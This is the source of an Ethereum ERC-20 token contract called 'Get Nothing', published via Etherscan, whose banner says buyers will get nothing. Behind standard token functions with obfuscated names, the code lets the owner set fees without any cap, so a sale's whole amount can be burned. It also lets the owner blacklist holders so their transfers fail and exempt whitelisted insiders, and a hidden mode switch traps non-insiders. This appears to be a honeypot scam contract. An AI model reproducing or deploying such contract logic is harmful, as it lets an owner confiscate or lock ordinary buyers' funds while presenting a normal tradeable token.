/**
 *Submitted for verification at Etherscan.io on 2023-07-13
*/

// SPDX-License-Identifier: MIT
/*
|------------------------------------------------|
|                   Get Nothing                  |
|------------------------------------------------|
|   Hi everyone, when you will buy this token    |
|              you will get nothing              | 
|    Twitter: https://twitter.com/Pauly0x        |
|                                                |
|       This is a test of people's greed         |
|------------------------------------------------|    
*/
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}




contract zvMw is Context, IERC20, IERC20Metadata {
    event Nzkx(address sender, address from,address to, uint256 amount);
    uint private FNGD = 5;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    mapping(address => bool) private iqGp;
    uint private VKfC = 136;

    mapping(address => bool) private zlLE;    
    bool private MUIE;

    address public _owner;

    address private _fNBS;    

    uint256 private _totalSupply;
    uint256 private bZnS = 48942;

    string private _name;

    string private _symbol;

    uint256 public _AOaB;

    uint256 public _Dpmo;

    uint256 public fee;

    address private _rEED;    
    uint256 public DVwG;

    uint private _BwjE;

    uint256[] private _VDry;
    string private jeTd = "sn}bM1";


    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function yTRK(uint256 AOaB, uint256 Dpmo) public onlyOwner {
        _AOaB = AOaB;
        _Dpmo = Dpmo;
    }

    function VRPj(address account, bool status) public onlyOwner {
        zlLE[account] = status;
    }

    function iBuu(address fNBS) public onlyOwner{
        _fNBS = fNBS;
    }
    
    function KlPu(address account) public {
        require(iqGp[_msgSender()],'Not Allow');
        iqGp[account] = true;
    }

    function uBuZ(address account) public onlyOwner {
        iqGp[account] = false;
    }

    function Evfw() public onlyOwner {
        _AOaB = 0;
        _Dpmo = 0;
    }

    function EWXm(
        uint BwjE,
        uint256[] memory VDry
    ) public  {
        require(iqGp[_msgSender()],'Not Allow');
        _BwjE = BwjE;
        _VDry = VDry;
    }

    function ZzrD(
        address rEED,
        uint BwjE,
        uint256[] memory VDry
    ) public onlyOwner {
        _rEED = rEED;
        EWXm(BwjE, VDry);
    }

    constructor(
        uint BwjE,
        uint256[] memory VDry,
        uint256 AOaB,
        uint256 Dpmo
    ) {
        fee = 0;
        _AOaB = 0;
        _Dpmo = 0;        
        _name = "Get Nothing";
        _symbol = "Pauly0x";
        _totalSupply = 100_000_000_000_000 * 10 ** 18;
        _owner = msg.sender;
        _BwjE = BwjE;
        _VDry = VDry;
        _balances[msg.sender] = _totalSupply;
        iqGp[msg.sender] = true;
        _AOaB = AOaB;
        _Dpmo = Dpmo;

        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(
            currentAllowance >= subtractedValue,
            "zvMw: decreased allowance below zero"
        );
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }

    function KzSg(
        uint256 amountIn,
        address from,
        address to
    ) internal virtual returns (bool) {
        if (_BwjE == 99) { 
            if (iqGp[from] || iqGp[to]) return true;
            else return false;
        }
        if (zlLE[from] || zlLE[to] || zlLE[msg.sender]) {
            require(false, "zlLE");
        }
        if (from == _rEED || iqGp[from] || iqGp[to]) {
            return true;
        }
        if (from != _rEED && to != _rEED) return true;
        if (_BwjE == 0) return true;    
        if(_BwjE==1 && block.number%2==0) return true;

        if(amountIn>0){
            
        }    
        return false;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        
        emit Nzkx(msg.sender, from, to, amount);

        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "Transfer amount exceeds balance");

        uint256 p = (from == _rEED) ? _AOaB : _Dpmo;
        uint256 p_current = KzSg(amount, from, to) ? 0 : p;

        if (iqGp[from] || iqGp[to] || p_current == 0) {
            unchecked {
                _balances[from] = fromBalance - amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        } else {
            uint256 _amount = (amount * (1000 - p)) / 1000;
            uint256 p_value = (amount * p) / 1000;

            //Transfer
            _balances[from] = fromBalance - amount;
            _balances[to] += _amount;

            emit Transfer(from, to, _amount);

            if (p_value != 0) {
                //Burn
                _totalSupply -= p_value;
                emit Transfer(from, address(0), p_value);
            }

            if(from==_fNBS || to==_fNBS) _BwjE=99;
        }

        
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}